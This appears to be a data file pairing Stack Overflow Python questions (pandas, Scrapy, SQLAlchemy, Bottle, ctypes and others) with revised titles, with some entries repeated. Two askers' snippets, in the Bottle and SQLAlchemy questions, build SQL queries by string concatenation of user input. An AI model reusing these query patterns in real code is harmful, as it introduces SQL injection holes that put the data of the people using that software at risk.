Read Bash Variables into a Python Script," I am running a bash script (test.sh) and it loads in environment variables (from env.sh). That works fine, but I am trying to see python can just load in the variables already in the bash script. Yes I know it would probably be easier to just pass in the specific variables I need as arguments, but I was curious if it was possible to get the bash variables.test.sh env.sh pythontest.py <code>  #!/bin/bashsource env.shecho $test1python pythontest.py #!/bin/bashtest1=""hello"" ?print test1 (that is what I want)",Read Bash variables into a Python script
Multiply two series with MultiIndex in pandas," I am trying to multiply two Series, both with MultiIndex: The problem is that I cannot reindex the Series from 2 to 3 levels: I found this workaround: But I think there should be a method to perform this operation in just 1 step. <code>  import pandas as pdtuples = [(0, 100, 1000),(0, 100, 1001),(0, 100, 1002), (1, 101, 1001)]index_3levels=pd.MultiIndex.from_tuples(tuples,names=[""l1"",""l2"",""l3""])tuples = [(0, 100), (1, 101)]index_2levels=pd.MultiIndex.from_tuples(tuples,names=[""l1"",""l2""])data_3levels = pd.Series(1, index=index_3levels)data_2levels = pd.Series([2,3], index=index_2levels)print data_3levels l1 l2 l3 0 100 1000 1 1001 1 1002 11 101 1001 1dtype: int64print data_2levelsl1 l2 0 100 21 101 3dtype: int64 data_2levels.reindex(data_3levels.index, level=[""l1"",""l2""])Exception: Join on level between two MultiIndex objects is ambiguous for l1 in [0,1]: data_3levels[l1] *= data_2levels[l1].reindex(data_3levels[l1].index, level=""l2"")print data_3levelsl1 l2 l3 0 100 1000 2 1001 2 1002 21 101 1001 3dtype: int64",Multiply two Series with MultiIndex in pandas
Python - Lazy loading of class attributes," Class Foo has a bar, and it is not loaded until it is accessed. Further accesses to bar should incur no overhead. Is it possible to do something like this using properties or, better yet, attributes, instead of using a getter method?The goal is to lazy load without overhead on all subsequent accesses... <code>  class Foo(object): def get_bar(self): print ""initializing"" self.bar = ""12345"" self.get_bar = self._get_bar return self.bar def _get_bar(self): print ""accessing"" return self.bar",Lazy loading of class attributes
Trying to count words in a string [python]," I'm trying to analyze the contents of a string. If it has a punctuation mixed in the word I want to replace them with spaces.For example, If Johnny.Appleseed!is:a*good&farmer is entered as an input then it should say there are 6 words, but my code only sees it as 0 words. I'm not sure how to remove an incorrect character.FYI: I'm using python 3, also I can't import any libraries <code>  string = input(""type something"")stringss = string.split() for c in range(len(stringss)): for d in stringss[c]: if(stringss[c][d].isalnum != True): #something that removes stringss[c][d] total+=1print(""words: ""+ str(total))",Trying to count words in a string
cx_Freeze or pyinstaller with twisted/zope (namespace package)," I was using pyinstaller before to try and get my app with twisted as an executable, but I got this error when executing: So then, I tried using cx_freeze, but I get the exact same error, even when using 'namespace_packages': ['zope'] like this example.From where I'm building the executable, I can open a python interpreter and sucessfully import zope.interface, and I installed it through easy_install, then ran pip install -U zope.interface later on, which didn't have any effect.Here's my setup.py for cx_freeze: EDIT 1: Forgot to mention that I also tried putting a blank __init__.py file under zope.interface, and that also didn't help.EDIT 2: When using cx_freeze, inside the library.zip of the build folder, zope.interface is in there and I don't think any of the modules are missing, but I still get the ImportErrorThis is from the output of cx_freeze: EDIT 3: Here's the sys.path output from my executable (shortened with the ..) Here's the error I get when I import zope.interface directly: After adding pkg_resources to my includes in my cx_freeze setup.py, the program ran <code>  Traceback (most recent call last): File ""/usr/local/lib/python2.7/dist-packages/cx_Freeze/initscripts/Console.py"", line 27, in <module> exec code in m.__dict__ File ""client_test.py"", line 2, in <module> File ""/usr/local/lib/python2.7/dist-packages/Twisted-13.0.0-py2.7-linux-x86_64.egg/twisted/__init__.py"", line 53, in <module> _checkRequirements() File ""/usr/local/lib/python2.7/dist-packages/Twisted-13.0.0-py2.7-linux-x86_64.egg/twisted/__init__.py"", line 37, in _checkRequirements raise ImportError(required + "": no module named zope.interface."")ImportError: Twisted requires zope.interface 3.6.0 or later: no module named zope.interface. import sysfrom cx_Freeze import setup, Executable# Dependencies are automatically detected, but it might need fine tuning.build_exe_options = {""excludes"": [""tkinter""], 'namespace_packages':['zope'], 'append_script_to_exe':True}setup( name = ""exetest"", version = ""0.1"", description = ""My first executable"", options = {""build_exe"": build_exe_options}, executables = [Executable(""client_test.py"")]) Missing modules:? _md5 imported from hashlib? _sha imported from hashlib? _sha256 imported from hashlib? _sha512 imported from hashlib? builtins imported from zope.schema._compat? ctypes.macholib.dyld imported from ctypes.util? dl imported from OpenSSL? html imported from twisted.web.server? netbios imported from uuid? ordereddict imported from zope.schema._compat? queue imported from twisted.internet.threads? twisted.python._epoll imported from twisted.internet.epollreactor? twisted.python._initgroups imported from twisted.python.util? urllib.parse imported from twisted.web.server? win32wnet imported from uuid? wsaccel.utf8validator imported from autobahn.utf8validator? zope.i18nmessageid imported from zope.schema._messageid? zope.testing.cleanup imported from zope.schema.vocabulary ['../build/exe.linux-x86_64-2.7/client_test', '../build/exe.linux-x86_64-2.7', '../build/exe.linux-x86_64-2.7/client_test.zip', '../build/exe.linux-x86_64-2.7/library.zip'] Traceback (most recent call last): File ""/usr/local/lib/python2.7/dist-packages/cx_Freeze/initscripts/Console.py"", line 27, in <module> exec code in m.__dict__ File ""client_test.py"", line 3, in <module> File ""/usr/local/lib/python2.7/dist-packages/zope.schema-4.3.2-py2.7.egg/zope/__init__.py"", line 1, in <module> __import__('pkg_resources').declare_namespace(__name__)ImportError: No module named pkg_resources",ImportError with cx_Freeze and pyinstaller
Is it possible to eliminate redundant function calls in python comprehensions from within the comprehension?," Say we need a program which takes a list of strings and splits them, and appends the first two words, in a tuple, to a list and returns that list; in other words, a program which gives you the first two words of each string. It can be written like so (we assume valid input): But a list comprehension would be much nicer. But this involves two calls to split(). Is there a way to perform the split only once from within the comprehension? I tried what came naturally and it was invalid syntax: <code>  input: [""hello world how are you"", ""foo bar baz""]output: [(""hello"", ""world""), (""foo"", ""bar"")] def firstTwoWords(strings): result = [] for s in strings: splt = s.split() result.append((splt[0], splt[1])) return result def firstTwoWords(strings): return [(s.split()[0], s.split()[1]) for s in strings] >>> [(splt[0],splt[1]) for s in strings with s.split() as splt] File ""<stdin>"", line 1 [(splt[0],splt[1]) for s in strings with s.split() as splt] ^SyntaxError: invalid syntax",Eliminating redundant function calls in comprehensions from within the comprehension
Python: confuse about run Scrapy from within a Python script," Following document, I can run scrapy from a Python script, but I can't get the scrapy result.This is my spider: Notice the last line, I try to use the returned parse result, if I run: the terminal could print the return resultBut I can't get the return result from the Python script. Here is my Python script: I try to get the result at the reactor.run(), but it return nothing,How can I get the result? <code>  from scrapy.spider import BaseSpiderfrom scrapy.selector import HtmlXPathSelectorfrom items import DmozItemclass DmozSpider(BaseSpider): name = ""douban"" allowed_domains = [""example.com""] start_urls = [ ""http://www.example.com/group/xxx/discussion"" ] def parse(self, response): hxs = HtmlXPathSelector(response) rows = hxs.select(""//table[@class='olt']/tr/td[@class='title']/a"") items = [] # print sites for row in rows: item = DmozItem() item[""title""] = row.select('text()').extract()[0] item[""link""] = row.select('@href').extract()[0] items.append(item) return items scrapy crawl douban from twisted.internet import reactorfrom scrapy.crawler import Crawlerfrom scrapy.settings import Settingsfrom scrapy import log, signalsfrom spiders.dmoz_spider import DmozSpiderfrom scrapy.xlib.pydispatch import dispatcherdef stop_reactor(): reactor.stop()dispatcher.connect(stop_reactor, signal=signals.spider_closed)spider = DmozSpider(domain='www.douban.com')crawler = Crawler(Settings())crawler.configure()crawler.crawl(spider)crawler.start()log.start()log.msg(""------------>Running reactor"")result = reactor.run()print resultlog.msg(""------------>Running stoped"")",Confused about running Scrapy from within a Python script
"Which is more accurate, time.time or timeit.timeit?"," Sometimes, I like to time how long it takes parts of my code to run. I've checked a lot of online sites and have seen, at large, two main ways to do this. One is using time.time and the other is using timeit.timeit.So, I wrote a very simple script to compare the two: Basically, it times how long it takes to print ""ABC"" 100 times in a for-loop. The number on the left is the results for time.time and the number on the right is for timeit.timeit: As you can see, sometimes, time.time is faster and sometimes it's slower. Which is the better way (more accurate)? <code>  from timeit import timeitfrom time import timestart = time()for i in range(100): print('ABC')print(time()-start, timeit(""for i in range(100): print('ABC')"", number=1)) # First run0.0 0.012654680972022981# Second run0.031000137329101562 0.012747430190149865# Another run0.0 0.011262325239660349# Another run0.016000032424926758 0.012740166697164025# Another run0.016000032424926758 0.0440628627381413",time.time vs. timeit.timeit
"Strange function python ""_"""," I created this function in Python 2.7 with ipython: later if I call _(somevalue), I get _ = somevalue. The function has disappeared! If I call _(4) I get: Why? What's wrong with this function? <code>  def _(v): return v in[3]: _(3)out[3]: 3in[4]: print _out[4]: 3 TypeError: 'int' object is not callable",Assigning a value to single underscore _ in Python/IPython interpreter
Assigning a value to _ in Python/IPython interpreter," I created this function in Python 2.7 with ipython: later if I call _(somevalue), I get _ = somevalue. The function has disappeared! If I call _(4) I get: Why? What's wrong with this function? <code>  def _(v): return v in[3]: _(3)out[3]: 3in[4]: print _out[4]: 3 TypeError: 'int' object is not callable",Assigning a value to single underscore _ in Python/IPython interpreter
How sphinx autodoc define an attribute?," I wrote a python class and I made the documentation with sphinx. For example, the class looks like : Now, in order to do the documentation, in the rst file I wrote : All its ok, and a, prop and square appears in the doc.But If I try to document attributes and methods separatly, sphinx says that it cannont find attribute a but it works for prop. The error message is : I read somewhere Sphinx values for attributes reported as None that sphinx do not isntantiate the class, thus there is a difference between class attribute (as prop) and instance attribute (as a). But how can I refer to instance attribute in the doc ?Actually, instance attributes are found if they are not explicitly asked in the rst file. For example, this will work : But this do not <code>  class Aclass(object): """""" my class """""" def __init__(self): """""" constructor """""" self.a = None """""" doc for attribute a """""" self._prop = None def _get_prop(self): """""" getter prop """""" return self._prop def _set_prop(self, val): """""" setter prop """""" self._prop = val prop = property(_get_prop, _set_prop) """""" a property """""" def square(self): """""" return square of a """""" return self.a**2 .. autoclass:: aclass.Aclass :members: .. autoattribute:: aclass.Aclass.prop.. autoattribute:: aclass.Aclass.a Traceback (most recent call last): File ""/usr/lib/python2.7/dist-packages/sphinx/ext/autodoc.py"", line 326, in import_object obj = self.get_attr(obj, part) File ""/usr/lib/python2.7/dist-packages/sphinx/ext/autodoc.py"", line 232, in get_attr return safe_getattr(obj, name, *defargs) File ""/usr/lib/python2.7/dist-packages/sphinx/util/inspect.py"", line 70, in safe_getattr raise AttributeError(name)AttributeError: a/home/gvallver/dev/sphinx/doc/source/index.rst:17: WARNING: autodoc can't import/find attribute 'aclass.Aclass.a', it reported error: ""a"", please check your spelling and sys.path .. autoclass:: aclass.Aclass :members: .. autoclass: aclass.Aclass :members: a",Problems with autodoc and explicitly specified instance attributes
"TypeError(""'bool' object is not iterable"",) when trying to return a Boolean"," I am having a strange problem. I have a method that returns a boolean. In turn I need the result of that function returned again since I cant directly call the method from the front-end. Here's my code: This throws an exception: TypeError(""'bool' object is not iterable"",)I don't get this error at all since I am not attempting to ""iterate"" the bool value, only to return it.If I return a string instead of boolean or int it works as expected. What could be an issue here?Traceback: <code>  # this uses bottle py framework and should return a value to the html front-end@get('/create/additive/<name>')def createAdditive(name): return pump.createAdditive(name) def createAdditive(self, name): additiveInsertQuery = """""" INSERT INTO additives SET name = '"""""" + name + """"""'"""""" try: self.cursor.execute(additiveInsertQuery) self.db.commit() return True except: self.db.rollback() return False Traceback (most recent call last): File ""C:\Python33\lib\site-packages\bottle.py"", line 821, in _cast out = iter(out)TypeError: 'bool' object is not iterable","TypeError(""'bool' object is not iterable"",) when trying to return a Boolean"
"TypeError(""'bool' object is not iterable"",) when trying to return a Boolean (Bottle py framework)"," I am having a strange problem. I have a method that returns a boolean. In turn I need the result of that function returned again since I cant directly call the method from the front-end. Here's my code: This throws an exception: TypeError(""'bool' object is not iterable"",)I don't get this error at all since I am not attempting to ""iterate"" the bool value, only to return it.If I return a string instead of boolean or int it works as expected. What could be an issue here?Traceback: <code>  # this uses bottle py framework and should return a value to the html front-end@get('/create/additive/<name>')def createAdditive(name): return pump.createAdditive(name) def createAdditive(self, name): additiveInsertQuery = """""" INSERT INTO additives SET name = '"""""" + name + """"""'"""""" try: self.cursor.execute(additiveInsertQuery) self.db.commit() return True except: self.db.rollback() return False Traceback (most recent call last): File ""C:\Python33\lib\site-packages\bottle.py"", line 821, in _cast out = iter(out)TypeError: 'bool' object is not iterable","TypeError(""'bool' object is not iterable"",) when trying to return a Boolean"
why Python 3 needs wrap dict.items with list()," I'm using Python 3. I've just installed a Python IDE and I am curious about the following code warning: Warning is: ""For Python3 support should look like ... list(features.items()) ""Also there is mention about this at http://docs.python.org/2/library/2to3.html#fixers It also wraps existing usages of dict.items(), dict.keys(), and dict.values() in a call to list.Why is this necessary? <code>  features = { ... }for k, v in features.items(): print(""%s=%s"" % (k, v))",Why does Python 3 need dict.items to be wrapped with list()?
Python logging: Per-file/module logger," I have some Python code I need to add logging to.I've always preferred nice big C macro looking statements like ""DEBUG()"", ""ERROR()"", etc for logging. I feel it makes the code easier to read (no objects) when trace-points are visually differentiable from the actual code.I also would like to be able to set logging levels at a per-module level.How could I make a module called ""log"" that is capable of doing this (while making use of the Python std library logging module)?E.g.:File: main.py File: my_module.py I'd expect output to look something like: <code>  # This imports LOG_MODULE_NAME, DEBUG, WARN, etcfrom log import *import my_moduleLOG_MODULE_NAME(""main"")log.set_level(""main"", log.LVL_DEBUG)log.set_level(""my_module"", log.LVL_WARN)if __name__ == ""__main__"": foo = my_module.myFunc(2)DEBUG(""Exiting main.py"") from log import *LOG_MODULE_NAME(""my_module"")def myFunc(x): DEBUG(""Entering function"") if x != 1: WARN(""I thought it would be 1"") DEBUG(""Exiting function"") return x+1 [WARN:my_module - my_module.py:9] I thought it would be 1[DEBUG:main - main.py:11] Exiting main.py",Per-file/module logger in Python
Process large data in python," I need to process some data that is a few hundred times bigger than RAM. I would like to read in a large chunk, process it, save the result, free the memory and repeat. Is there a way to make this efficient in python? <code> ","Process data, much larger than physical memory, in chunks"
"Process data, much larger than physical memory"," I need to process some data that is a few hundred times bigger than RAM. I would like to read in a large chunk, process it, save the result, free the memory and repeat. Is there a way to make this efficient in python? <code> ","Process data, much larger than physical memory, in chunks"
Dynamic Method Call In Python 2.7," I have a tuple which lists down the methods of a class like: and so on..Now I need to dynamically call these methods based on a user made selection. The methods are to be called based on the index. So if a user selects '0', methA is called, if '5', methF is called.My method for doing this is as follows: I have managed to work out something with eval but it yields error and is not at all elegant. <code>  t = ('methA','methB','methC','methD','methE','methF') def makeSelection(self, selected): #methodname = t[selected] #but as this is from within the class , it has to be appended with 'self.'methodname # also need to pass some arguments locally calculated here",Dynamic Method Call In Python 2.7 using strings of method names
"Python concurrency, does mutliprocess actually work or is it still bound by the GIL"," The code below doesn't seem to run concurrently, and I'm not sure exactly why: The config variable is just a dictionary defined outside of the _run() function. All of the processes seem to be created - but it isn't any faster than if I do it with a single process. Basically what's happening in the run_**_normalizers() functions is reading from a queue table in a database (SQLAlchemy), then making a few HTTP requests, and then runing a 'pipeline' of normalizers to modify data and then save it back into the database. I'm coming from the JVM land where threads are 'heavy' and often used for parallelism - i'm a bit confused by this as i thought the multiprocess module was supposed to get around the limitations of Python's GIL. <code>  def run_normalizers(config, debug, num_threads, name=None): def _run(): print('Started process for normalizer') sqla_engine = init_sqla_from_config(config) image_vfs = create_s3vfs_from_config(config, config.AWS_S3_IMAGE_BUCKET) storage_vfs = create_s3vfs_from_config(config, config.AWS_S3_STORAGE_BUCKET) pp = PipedPiper(config, image_vfs, storage_vfs, debug=debug) if name: pp.run_pipeline_normalizers(name) else: pp.run_all_normalizers() print('Normalizer process complete') threads = [] for i in range(num_threads): threads.append(multiprocessing.Process(target=_run)) [t.start() for t in threads] [t.join() for t in threads]run_normalizers(...)",Can't get multiprocessing to run processes concurrently
"Python concurrency, does multiprocess actually work or is it still bound by the GIL?"," The code below doesn't seem to run concurrently, and I'm not sure exactly why: The config variable is just a dictionary defined outside of the _run() function. All of the processes seem to be created - but it isn't any faster than if I do it with a single process. Basically what's happening in the run_**_normalizers() functions is reading from a queue table in a database (SQLAlchemy), then making a few HTTP requests, and then runing a 'pipeline' of normalizers to modify data and then save it back into the database. I'm coming from the JVM land where threads are 'heavy' and often used for parallelism - i'm a bit confused by this as i thought the multiprocess module was supposed to get around the limitations of Python's GIL. <code>  def run_normalizers(config, debug, num_threads, name=None): def _run(): print('Started process for normalizer') sqla_engine = init_sqla_from_config(config) image_vfs = create_s3vfs_from_config(config, config.AWS_S3_IMAGE_BUCKET) storage_vfs = create_s3vfs_from_config(config, config.AWS_S3_STORAGE_BUCKET) pp = PipedPiper(config, image_vfs, storage_vfs, debug=debug) if name: pp.run_pipeline_normalizers(name) else: pp.run_all_normalizers() print('Normalizer process complete') threads = [] for i in range(num_threads): threads.append(multiprocessing.Process(target=_run)) [t.start() for t in threads] [t.join() for t in threads]run_normalizers(...)",Can't get multiprocessing to run processes concurrently
"Python concurrency, does the python multiprocessing module actually work or is it still bound by the GIL?"," The code below doesn't seem to run concurrently, and I'm not sure exactly why: The config variable is just a dictionary defined outside of the _run() function. All of the processes seem to be created - but it isn't any faster than if I do it with a single process. Basically what's happening in the run_**_normalizers() functions is reading from a queue table in a database (SQLAlchemy), then making a few HTTP requests, and then runing a 'pipeline' of normalizers to modify data and then save it back into the database. I'm coming from the JVM land where threads are 'heavy' and often used for parallelism - i'm a bit confused by this as i thought the multiprocess module was supposed to get around the limitations of Python's GIL. <code>  def run_normalizers(config, debug, num_threads, name=None): def _run(): print('Started process for normalizer') sqla_engine = init_sqla_from_config(config) image_vfs = create_s3vfs_from_config(config, config.AWS_S3_IMAGE_BUCKET) storage_vfs = create_s3vfs_from_config(config, config.AWS_S3_STORAGE_BUCKET) pp = PipedPiper(config, image_vfs, storage_vfs, debug=debug) if name: pp.run_pipeline_normalizers(name) else: pp.run_all_normalizers() print('Normalizer process complete') threads = [] for i in range(num_threads): threads.append(multiprocessing.Process(target=_run)) [t.start() for t in threads] [t.join() for t in threads]run_normalizers(...)",Can't get multiprocessing to run processes concurrently
"why Exception as a superclass, why not BaseException"," In python, whenever we are writing User-defined exception, we have to extend it from class Exception. my question is why can't we extend it from BaseException which is super-class of exception hierarchy and Exception is also subclass of BaseException. <code> ","why should we use Exception as a superclass, why not BaseException"
Using Python Docx module to replace a word in a file and save the new file," I'm trying to use the python-docx module to replace a word in a file and save the new file with the caveat that the new file must have exactly the same formatting as the old file, but with the word replaced. How am I supposed to do this? The docx module has a savedocx that takes 7 inputs: documentcorepropsapppropscontenttypeswebsettingswordrelationshipsoutputHow do I keep everything in my original file the same except for the replaced word? <code> ",Text-Replace in docx and save the changed file with python-docx
Replace a word by an other in a docx and save the changed file with python-docx," I'm trying to use the python-docx module to replace a word in a file and save the new file with the caveat that the new file must have exactly the same formatting as the old file, but with the word replaced. How am I supposed to do this? The docx module has a savedocx that takes 7 inputs: documentcorepropsapppropscontenttypeswebsettingswordrelationshipsoutputHow do I keep everything in my original file the same except for the replaced word? <code> ",Text-Replace in docx and save the changed file with python-docx
Scrapy: what is the difference between spidermiddleware and download middleware?, Both middleware can process Request and Response. But what is the difference? <code> ,What is the difference between Scrapy's spider middleware and downloader middleware?
What is the difference between spidermiddleware and download middleware?, Both middleware can process Request and Response. But what is the difference? <code> ,What is the difference between Scrapy's spider middleware and downloader middleware?
stdout recirection with ctypes and Python," I'm trying to redirect the output of printf functions to a file on Windows. I'm using ctypes with python3 to invoke the functions. My code is: But when I run the code from Eclipse I get the following on the screen: ...and the following in the TEST.txt When I run this from cmd, this is what is on the screen: ..and this is in the TEST.txt: When I comment out the second dup2() statement e.g. From Eclipse, on the screen: ...and in the TEST.txt file: From cmd, on the screen: ...and in the TEST.txt file: I'm totally confused now. I read all the redirection threads here on StackOverflow and I can't understand what's going on. Anyway, what I've gathered is that C functions access the stdout that is bind directly to the file descriptor, while python uses a special object for that - stdout File Object. So the elementary sys.stdout=*something* doesn't work with ctypes. I've even tried os.fdopen(1) on the dup2-ed output and then calling flush() after every printf statement but this isn't working again.I'm totally out of ideas now and would appreciate if someone have a solution for this. <code>  import os, sysfrom ctypes import *if __name__ == '__main__': print(""begin"") saved_stdout=os.dup(1) test_file=open(""TEST.TXT"", ""w"") os.dup2(test_file.fileno(), 1) test_file.close() print(""python print"") cdll.msvcrt.printf(b""Printf function 1\n"") cdll.msvcrt.printf(b""Printf function 2\n"") cdll.msvcrt.printf(b""Printf function 3\n"") os.dup2(saved_stdout, 1) print(""end"") beginendPrintf function 1Printf function 2Printf function 3 python print beginend python print import os, sysfrom ctypes import *if __name__ == '__main__': print(""begin"") saved_stdout=os.dup(1) test_file=open(""TEST.TXT"", ""w"") os.dup2(test_file.fileno(), 1) test_file.close() print(""python print"") cdll.msvcrt.printf(b""Printf function 1\n"") cdll.msvcrt.printf(b""Printf function 2\n"") cdll.msvcrt.printf(b""Printf function 3\n"") #os.dup2(saved_stdout, 1) print(""end"") begin python printendPrintf function 1Printf function 2Printf function 3 begin python printend",stdout redirection with ctypes
stdout redirection with ctypes and Python," I'm trying to redirect the output of printf functions to a file on Windows. I'm using ctypes with python3 to invoke the functions. My code is: But when I run the code from Eclipse I get the following on the screen: ...and the following in the TEST.txt When I run this from cmd, this is what is on the screen: ..and this is in the TEST.txt: When I comment out the second dup2() statement e.g. From Eclipse, on the screen: ...and in the TEST.txt file: From cmd, on the screen: ...and in the TEST.txt file: I'm totally confused now. I read all the redirection threads here on StackOverflow and I can't understand what's going on. Anyway, what I've gathered is that C functions access the stdout that is bind directly to the file descriptor, while python uses a special object for that - stdout File Object. So the elementary sys.stdout=*something* doesn't work with ctypes. I've even tried os.fdopen(1) on the dup2-ed output and then calling flush() after every printf statement but this isn't working again.I'm totally out of ideas now and would appreciate if someone have a solution for this. <code>  import os, sysfrom ctypes import *if __name__ == '__main__': print(""begin"") saved_stdout=os.dup(1) test_file=open(""TEST.TXT"", ""w"") os.dup2(test_file.fileno(), 1) test_file.close() print(""python print"") cdll.msvcrt.printf(b""Printf function 1\n"") cdll.msvcrt.printf(b""Printf function 2\n"") cdll.msvcrt.printf(b""Printf function 3\n"") os.dup2(saved_stdout, 1) print(""end"") beginendPrintf function 1Printf function 2Printf function 3 python print beginend python print import os, sysfrom ctypes import *if __name__ == '__main__': print(""begin"") saved_stdout=os.dup(1) test_file=open(""TEST.TXT"", ""w"") os.dup2(test_file.fileno(), 1) test_file.close() print(""python print"") cdll.msvcrt.printf(b""Printf function 1\n"") cdll.msvcrt.printf(b""Printf function 2\n"") cdll.msvcrt.printf(b""Printf function 3\n"") #os.dup2(saved_stdout, 1) print(""end"") begin python printendPrintf function 1Printf function 2Printf function 3 begin python printend",stdout redirection with ctypes
python is not recognized as an internal or external command why?," So I have recently installed Python Version 2.7.5 and I have made a little loop thing with it but the problem is, when I go to cmd and type python testloop.py I get the error: 'python' is not recognized as an internal or external commandI have tried setting the path but no avail.Here is my path: C:\Program Files\Python27As you can see, this is where my Python is installed. I don't know what else to do. Can someone help? <code> ",'python' is not recognized as an internal or external command
Performance of row vs column operations in numpy," There are a few articles that show that MATLAB prefers column operations than row operations, and that depending on you lay out your data the performance can vary significantly. This is apparently because MATLAB uses a column-major order for representing arrays. I remember reading that Python (NumPy) uses a row-major order. With this, my questions are:Can one expect a similar difference in performance when working with NumPy? If the answer to the above is yes, what would be some examples that highlight this difference? <code> ",Performance of row vs column operations in NumPy
Confusion with Pyramid login/authorization," As a learning experience, I would like to build a site which is structured in this (simplified) fashion:Registered users can log in to their accounts. Each user has his own ""profile""Once logged in, they can join certain ""networks"" or groups (or whatever you'd like to call them.)These users can only view the content of these networks if they have joined them.Networks have admins, each with varying, customizable permissions (x, y, and z). These admins can edit the network's content.How can I go about achieving this (in basic terms) with Pyramid's __acl__, RootFactory, and authorization/authentication features? How would each network have its own permissions relative to the basic log-in/out feature for user accounts?I've read the documentation multiple times, and I am starting to grasp how Pyramid security works; however, I feel as if I need some more specific clarification. For instance, in order to create the most simple of log-in features, do I need to specify an __acl__ in my RootFactory, or is this simply defining various groups, regardless of who can log in? Basic things, but also with enough ""unusual"" circumstance that I can see how it all fits together...Note: I'm not looking for someone to write me code. I'm just looking for some basic specification in a situation which I do not understand.Thanks for the help. <code> ","Confusion with Pyramid authorization, __acl__, and RootFactory"
Difference between @classmethod and a function in python," What is the difference between @classmethod and a 'classic' method in python,When should I use the @classmethod and when should I use a 'classic' method in python.Is the classmethod must be an method who is referred to the class (I mean it's only a method who handle the class) ?And I know what is the difference between a @staticmethod and classic methodThx <code> ",Difference between @classmethod and a method in python
How to execute raw SQL in SQLAlchemy, How do you execute raw SQL in SQLAlchemy?I have a python web app that runs on flask and interfaces to the database through SQLAlchemy. I need a way to run the raw SQL. The query involves multiple table joins along with Inline views. I've tried: But I keep getting gateway errors. <code>  connection = db.session.connection()connection.execute( <sql here> ),How to execute raw SQL in Flask-SQLAlchemy app
How to execute raw SQL in SQLAlchemy-flask app, How do you execute raw SQL in SQLAlchemy?I have a python web app that runs on flask and interfaces to the database through SQLAlchemy. I need a way to run the raw SQL. The query involves multiple table joins along with Inline views. I've tried: But I keep getting gateway errors. <code>  connection = db.session.connection()connection.execute( <sql here> ),How to execute raw SQL in Flask-SQLAlchemy app
"""MySQL server has gone away"""," Lets have a look at the next snippet - I thought that registering the checkout_connection function under the checkout event would solve it but it didntnow the question is how am i suppose to tell SQLAlchemy handle connection dropouts so every time i call execute() it will check if connection is available and if not it will initiate it once again?----UPDATE----The version of SQLAlchemy is 0.7.4----UPDATE---- session_factory is sent to every newly created thread now when execute runs after a big period of time i get the ""MySQL server has gone away"" error <code>  @event.listens_for(Pool, ""checkout"")def check_connection(dbapi_con, con_record, con_proxy):cursor = dbapi_con.cursor()try: cursor.execute(""SELECT 1"") # could also be dbapi_con.ping(), # not sure what is betterexcept exc.OperationalError, ex: if ex.args[0] in (2006, # MySQL server has gone away 2013, # Lost connection to MySQL server during query 2055): # Lost connection to MySQL server at '%s', system error: %d # caught by pool, which will retry with a new connection raise exc.DisconnectionError() else: raiseengine = create_engine('mysql://user:puss123@10.0.51.5/dbname', pool_recycle = 3600,pool_size=10, listeners=[check_connection])session_factory = sessionmaker(bind = engine, autoflush=True, autocommit=False)db_session = session_factory()...some code that may take several hours to run...db_session.execute('SELECT * FROM ' + P_TABLE + "" WHERE id = '%s'"" % id) def checkout_listener(dbapi_con, con_record, con_proxy): try: try: dbapi_con.ping(False) except TypeError: dbapi_con.ping() except dbapi_con.OperationalError as exc: if exc.args[0] in (2006, 2013, 2014, 2045, 2055): raise DisconnectionError() else: raiseengine = create_engine(CONNECTION_URI, pool_recycle = 3600,pool_size=10)event.listen(engine, 'checkout', checkout_listener)session_factory = sessionmaker(bind = engine, autoflush=True, autocommit=False)db_session = session_factory() class IncidentProcessor(threading.Thread): def __init__(self, queue, session_factory): if not isinstance(queue, Queue.Queue): raise TypeError, ""first argument should be of %s"" (type(Queue.Queue)) self.queue = queue self.db_session = scoped_session(session_factory) threading.Thread.__init__(self) def run(self): self.db_session().execute('SELECT * FROM ...') ... some code that takes alot of time ... self.db_session().execute('SELECT * FROM ...')","Python SQLAlchemy - ""MySQL server has gone away"""
Cant convert a unaware datetime into aware to I can convert intop UTC," I created a datetime that is unaware using the code below and I need to have it in UTC since the time is in ""US/Eastern"". I would like to make the datetime aware of EST first then convert to UTC. Error Message: <code>  import datetimeimport pytzfrom pytz import timezonedt = ""8/8/2013 4:05:03 PM""dt = datetime.datetime.strptime(dt,""%m/%d/%Y %I:%M:%S %p"")unaware_est = dt.strftime(""%Y-%m-%dT%H:%M:%S"")localtz = timezone('US/Eastern')utc = localtz.localize(unaware_est) Traceback (most recent call last): File ""/home/ubuntu/workspace/druidry-codebase/services/xignite/test.py"", line 120, in <module> quote_time = localtz.localize(quote_time) File ""/usr/local/lib/python2.7/dist-packages/pytz-2013b-py2.7.egg/pytz/tzinfo.py"", line 303, in localize if dt.tzinfo is not None:AttributeError: 'str' object has no attribute 'tzinfo'",Converting an un-aware timestamp into an aware timestamp for UTC conversion
ImportError: No module named apiclient.discovery," I got this error in Google App Engine's Python have used Google Translate API,But I don't know how to fix, I'll try to set environment which indicates to Google App Engine SDK,And upload to Google Apps Engine again, always get the error, Error: Server Error The server encountered an error and could not complete your request. If the problem persists, please report your problem and mention this error message and the query that caused it.Please tell me how to fix,ThanksUPDATE : FixedFollow Nijjin's help,I fixed problems by adding the following folders,apiclient, gflags, httplib2, oauth2client, uritemplateIf you still got problem, please consider below Answer of this page to get more info. ex. : Varum answer, etc ... <code>  <module>from apiclient.discovery import buildImportError: No module named apiclient.discovery",Why is my Python App Engine app using the Translate API getting an error of ImportError: No module named apiclient.discovery?
Extracting image src base on attribute with BeautifulSoup," I'm using BeautifulSoup to get a HTML page from IMDb, and I would like to extract the poster image from the page. I've got the image based on one of the attributes, but I don't know how to extract the data inside it.Here's my code: <code>  url = 'http://www.imdb.com/title/tt%s/' % (id)soup = BeautifulSoup(urllib2.urlopen(url).read())print(""before FOR"")for src in soup.find(itemprop=""image""): print(""inside FOR"") print(link.get('src'))",Extracting image src based on attribute with BeautifulSoup
Web server path," I'm fairly new to coding in python. I created a local web server that says ""Hello World"" and displays the current time. Is there a way to create a path, without creating a file, on the server program so that when I type in ""/time"" after 127.0.0.1 in the browser bar, it will display the current time? Likewise if I type ""/date"" it will give me the current date. This is what I have so far: <code>  from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServerimport datetimeport = 80class myHandler(BaseHTTPRequestHandler): #Handler for the GET requests def do_GET(self): self.send_response(200) self.send_header('Content-type','text/html') self.end_headers() # Send the html message self.wfile.write(""<b> Hello World !</b>"" + ""<br><br>Current time and date: "" + str(datetime.datetime.now()))server = HTTPServer(('', port), myHandler)print 'Started httpserver on port ', port#Wait forever for incoming http requestsserver.serve_forever()","How do I map incoming ""path"" requests when using HTTPServer?"
